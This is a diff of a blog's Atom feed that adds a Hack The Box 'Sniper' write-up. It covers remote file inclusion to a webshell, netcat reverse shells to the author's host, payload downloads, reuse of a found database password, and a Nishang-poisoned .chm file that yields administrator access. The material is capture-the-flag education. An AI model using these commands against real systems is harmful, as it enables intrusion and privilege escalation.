@@ -1,6 +1,254 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-22T15:53:17+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-28T22:04:16+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
 Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
-</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">OAuth 2</title><link href="http://localhost:4000/2020/03/22/oauth-2.html" rel="alternate" type="text/html" title="OAuth 2" /><published>2020-03-22T00:00:00+05:45</published><updated>2020-03-22T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/22/oauth-2</id><content type="html" xml:base="http://localhost:4000/2020/03/22/oauth-2.html">&lt;hr /&gt;
+</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box: Sniper</title><link href="http://localhost:4000/2020/03/28/htb-sniper.html" rel="alternate" type="text/html" title="Hack The Box: Sniper" /><published>2020-03-28T00:00:00+05:45</published><updated>2020-03-28T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/28/htb-sniper</id><content type="html" xml:base="http://localhost:4000/2020/03/28/htb-sniper.html">&lt;h2 id=&quot;htbsniper&quot;&gt;HTB:Sniper&lt;/h2&gt;
+
+&lt;p&gt;Sniper box is easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).&lt;/p&gt;
+
+&lt;h2 id=&quot;box-details&quot;&gt;Box Details&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/sniperdetail.png&quot; alt=&quot;box_detail&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the above it’s ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.14.151&lt;/code&gt; ,I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as sniper.htb. Let’s solve this box.&lt;/p&gt;
+
+&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;/h2&gt;
+
+&lt;p&gt;Let’s start with universal port scanner, &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to see the open port and service which shows &lt;code class=&quot;highlighter-rouge&quot;&gt;port 80&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; service&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.80 scan initiated Fri Mar 27 21:34:08 2020 as: nmap -sS -sC -sV -Pn -oA nmap.txt 10.10.10.151
+Nmap scan report for sniper.htb (10.10.10.151)
+Host is up (0.41s latency).
+Not shown: 996 filtered ports
+PORT    STATE SERVICE       VERSION
+80/tcp  open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Sniper Co.
+135/tcp open  msrpc         Microsoft Windows RPC
+139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds?
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 7h03m03s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-03-27T22:53:18
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Mar 27 21:35:52 2020 -- 1 IP address (1 host up) scanned in 103.56 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;web-enumeration&quot;&gt;Web Enumeration&lt;/h3&gt;
+&lt;p&gt;sniper.htb
+After I noticed port &lt;code class=&quot;highlighter-rouge&quot;&gt;80&lt;/code&gt; is opened I visited that site and got this as output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/sniper_htb.jpg&quot; alt=&quot;sniperhtb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;From above, I found it was a good delivery website. So I checked everypart of the website and found this directory as interesting &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sniper.htb/blog/index.php&lt;/code&gt; . Here I found language where I was able to change the language &lt;code class=&quot;highlighter-rouge&quot;&gt;http://sniper.htb/blog/?lang=blog-en.php&lt;/code&gt; . This happens due to the RFI (Remote File Inclusion) vulnerability in the webservices.&lt;/p&gt;
+
+&lt;h3 id=&quot;webshell&quot;&gt;Webshell&lt;/h3&gt;
+&lt;p&gt;Since &lt;code class=&quot;highlighter-rouge&quot;&gt;Sniper&lt;/code&gt; had &lt;code class=&quot;highlighter-rouge&quot;&gt;SMB(Server Mail Box)&lt;/code&gt; service. So I combined with RFI to get a webshell. For that you can follow this link &lt;a href=&quot;http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/sniper_webshell.png&quot; alt=&quot;webshell.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Above you can see the webshell. So, now I used nc to get the actually shell. For that I had to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; to the webshell. 
+If you don’t have then you can download from &lt;a href=&quot;https://github.com/gr4n173/tools.git&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;Now before uploading that I made a dir named &lt;code class=&quot;highlighter-rouge&quot;&gt;gr4n173&lt;/code&gt;&lt;br /&gt;
+you can see the pic below.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/nc_uploaded.png&quot; alt=&quot;nc_shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then uploaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; tool to that directory as:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/upload_nc.png&quot; alt=&quot;uploadnc&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;unprivileged-shell&quot;&gt;Unprivileged shell&lt;/h3&gt;
+
+&lt;p&gt;Now I setup a listener on and used the command of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; as:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/reverse_shell.png&quot; alt=&quot;reverse&quot; /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;listener&quot;&gt;Listener:&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 50602
+Microsoft Windows [Version 10.0.17763.678]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\gr4n173&amp;gt;whoami
+whoami
+nt authority\iusr
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Here I was unable to run any commands, so I switched to powershell as:&lt;/p&gt;
+
+&lt;h4 id=&quot;power-shell&quot;&gt;Power shell&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\gr4n173&amp;gt;powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\gr4n173&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I found the &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris&lt;/code&gt; user. Since I m in unprivelege I wasn’t given any permission.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users&amp;gt; ls
+ls
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----         4/9/2019   6:47 AM                Administrator                                                         
+d-----        4/11/2019   7:04 AM                Chris                                                                 
+d-r---         4/9/2019   6:47 AM                Public                                                                
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Now I had to change the user from unprivileged to privileged for that I searched everypart of the dir and found the creds of user &lt;code class=&quot;highlighter-rouge&quot;&gt;chris&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris:36mEAhz/B8xQ~2VM&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\inetpub\wwwroot\user&amp;gt; more db.php
+more db.php
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Enter your Host, username, password, database below.&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// I left password empty because i do not set password on localhost.&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$con&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysqli_connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dbuser&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;36mEAhz/B8xQ~2VM&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sniper&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Check connection&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mysqli_connect_errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Failed to connect to MySQL: &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mysqli_connect_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;By combining creds and &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; I got the user shell. Before that I created the folder &lt;code class=&quot;highlighter-rouge&quot;&gt;files&lt;/code&gt; and downloaded the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; tool inside. Since it’s2020 as python2 died so I used python3 server as&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\gr4n173&amp;gt; cd files
+cd files
+PS C:\gr4n173\files&amp;gt; Invoke-Webrequest -Uri http://10.10.14.11:8000/nc.exe -OutFile nc.exe
+Invoke-Webrequest -Uri http://10.10.14.11:8000/nc.exe -OutFile nc.exe
+PS C:\gr4n173\files&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~var/www/html/pub$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.151 - - [28/Mar/2020 20:38:14] &quot;GET /nc.exe HTTP/1.1&quot; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally downloaded &lt;code class=&quot;highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt;. Now I used &lt;code class=&quot;highlighter-rouge&quot;&gt;creds&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Invoke-Command&lt;/code&gt; to know the if I can run the command as&lt;/p&gt;
+
+&lt;h3 id=&quot;privilege-user&quot;&gt;Privilege User&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\gr4n173\files&amp;gt; $pass =cOnvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+$pass =cOnvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
+PS C:\gr4n173\files&amp;gt; $cred = New-Object System.Management.Automation.PSCredential(&quot;.\chris&quot;,$pass)
+$cred = New-Object System.Management.Automation.PSCredential(&quot;.\chris&quot;,$pass)
+PS C:\gr4n173\files&amp;gt; Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred 
+Invoke-Command -Computer Sniper -ScriptBlock { whoami } -Credential $cred 
+sniper\chris
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;From above command, at first I defined a variable &lt;code class=&quot;highlighter-rouge&quot;&gt;$pass&lt;/code&gt; which store the password and another variable &lt;code class=&quot;highlighter-rouge&quot;&gt;cred&lt;/code&gt; for passing the &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;pass&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt; and final command give the output of &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; after passing the two variable to &lt;code class=&quot;highlighter-rouge&quot;&gt;Powershell&lt;/code&gt;. This indicate I can run the &lt;code class=&quot;highlighter-rouge&quot;&gt;command&lt;/code&gt; .&lt;/p&gt;
+
+&lt;h2 id=&quot;reverse-shell&quot;&gt;Reverse shell&lt;/h2&gt;
+
+&lt;p&gt;So I used the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc reverse shell&lt;/code&gt; as with a listener on.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\gr4n173\files&amp;gt; Invoke-Command -Computer Sniper -ScriptBlock { C:\gr4n173\files\nc.exe 10.10.14.11 4445 -e powershell } -Credential $cred 
+Invoke-Command -Computer Sniper -ScriptBlock { C:\gr4n173\files\nc.exe 10.10.14.11 4445 -e powershell } -Credential $cred 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h5 id=&quot;listener-1&quot;&gt;Listener:&lt;/h5&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 50671
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+ 
+PS C:\Users\Chris\Documents&amp;gt; hostname
+hostname
+Sniper
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This way finally I got the user.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Chris\Desktop&amp;gt; ls
+ls
+    Directory: C:\Users\Chris\Desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        4/11/2019   8:15 AM             32 user.txt                                                              
+
+
+PS C:\Users\Chris\Desktop&amp;gt; more user.txt
+more user.txt
+21f4d******************
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;hr /&gt;
+&lt;h2 id=&quot;user-to-root&quot;&gt;User to Root&lt;/h2&gt;
+
+&lt;p&gt;For root I searched every part of the user shell and got the uncomplete &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file inside Chris’s Downloads:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Chris\Downloads&amp;gt; ls
+ls
+    Directory: C:\Users\Chris\Downloads
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----        4/11/2019   8:36 AM          10462 instructions.chm
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;poisoning-chm&quot;&gt;Poisoning .chm&lt;/h3&gt;
+
+&lt;p&gt;Now to posioion I used &lt;code class=&quot;highlighter-rouge&quot;&gt;Out-CHM.ps1&lt;/code&gt; while  from &lt;a href=&quot;https://github.com/samratashok/nishang&quot;&gt;Nishang&lt;/a&gt; which is quite Interesting git repo especially related to window.&lt;/p&gt;
+
+&lt;p&gt;I used nishand tool and opened it in powershell.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS: &amp;gt; Import-Module .\Out-CHM.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now I used the powershell to bypasss the Antivirus security.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS: &amp;gt; powershell.exe -ExecutionPolicy Bypass
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then I download the &lt;code class=&quot;highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; to the Chris’s Documents folder as&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS: &amp;gt; Out-CHM -Payload &quot;cd C:\Users\Chris\Documents;./nc64.exe
+10.10.14.11 8888 -e powershell&quot; -HHCPath &quot;C:\Program Files (x86)\HTML
+Help Workshop&quot; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Here, I defined the dir of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; and used &lt;a href=&quot;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&quot;&gt;this&lt;/a&gt; to exploit. File named &lt;code class=&quot;highlighter-rouge&quot;&gt;doc.chm&lt;/code&gt; created and you can get here &lt;a href=&quot;/pubic/files/doc.chm&quot;&gt;file&lt;/a&gt;.This way I created the poison of &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file&lt;/p&gt;
+
+&lt;p&gt;Now I downloaded the created file to user shell &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris&lt;/code&gt; with a listener on along with the &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 server&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/pub&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:\Users\Chris\Documents&amp;gt; Invoke-Webrequest -Uri http://10.10.14.11:8000/doc.chm -OutFile doc.chm                                                                   
+Invoke-Webrequest -Uri http://10.10.14.11:8000/doc.chm -OutFile doc.chm  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;root-shell&quot;&gt;Root Shell&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~$nc -lvnp 8888                              
+listening on [any] 8888 ...  
+connect to [10.10.14.11] from (UNKNOWN) [10.10.10.151] 53447                 
+Microsoft Windows [Version 10.0.17763.678]                                   
+C:\Windows\system32&amp;gt;whoami                                                   
+sniper\administrator                                                         
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;This way I can read the &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt;file.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+PS C:\Users\Administrator\Desktop&amp;gt; more root.txt     
+5624caf********************     
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This way I got the root of Sniper box and learned alot from this box. So I would like to thank creators of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;MinatoTW &amp;amp; felamos&lt;/code&gt; for such an awesome box. Especially poisoning &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; was awesome.&lt;/p&gt;
+
+&lt;p&gt;I will be posting writeup of next box after box retired. 
+I would like to Thank readers for being with me through out this writeup.
+Feedback are really appreciated !!
+Tweet about this writeup if you like.&lt;/p&gt;
+
+&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="windows" /><category term="SMB" /><category term=".chm" /><category term="Powershell" /><category term="nc.exe" /><category term="webshell" /><category term="Invoke" /><category term="nishang" /><category term="htb" /><summary type="html">HTB:Sniper</summary></entry><entry><title type="html">OAuth 2</title><link href="http://localhost:4000/2020/03/22/oauth-2.html" rel="alternate" type="text/html" title="OAuth 2" /><published>2020-03-22T00:00:00+05:45</published><updated>2020-03-22T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/22/oauth-2</id><content type="html" xml:base="http://localhost:4000/2020/03/22/oauth-2.html">&lt;hr /&gt;
 
 &lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
 
